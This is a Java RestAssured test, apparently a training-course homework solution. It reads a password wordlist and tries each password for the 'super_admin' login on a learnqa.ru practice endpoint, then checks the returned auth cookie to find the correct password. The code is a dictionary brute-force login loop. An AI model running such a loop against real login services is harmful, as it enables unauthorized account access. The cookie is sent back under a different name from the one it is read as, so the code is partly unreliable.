import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class Password {
    @Test
    public void Password() throws IOException {


        List<String> passwords = Files.readAllLines(Paths.get("C:\\Users\\kzhu\\RESTAPI\\LearnQA_Java_API\\target\\password.txt"), StandardCharsets.UTF_8);
        for (String pass : passwords) {


            Map<String, String> data = new HashMap<>();
            data.put("login", "super_admin");
            data.put("password", pass);

            Response responseForGet = RestAssured
                    .given()
                    .body(data)
                    .when()
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();

            String responseCookie = responseForGet.getCookie("auth_cookie");
            System.out.println("\nCookie:");
            System.out.println(responseCookie);

            Map<String, String> cookies = new HashMap<>();
            if (responseCookie != null) {
                cookies.put("auth.cookie", responseCookie);
            }

            Response responseForCheck = RestAssured
                    .given()
                    .body(data)
                    .cookies(cookies)
                    .when()
                    .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie");

            System.out.println("Status:");
            responseForCheck.print();

            String check= responseForCheck.asString();
            String verify = "You are authorized";
            if (check.equals(verify)) {
                System.out.println("Password:");
                System.out.println(pass);

            }

        }


    }
}
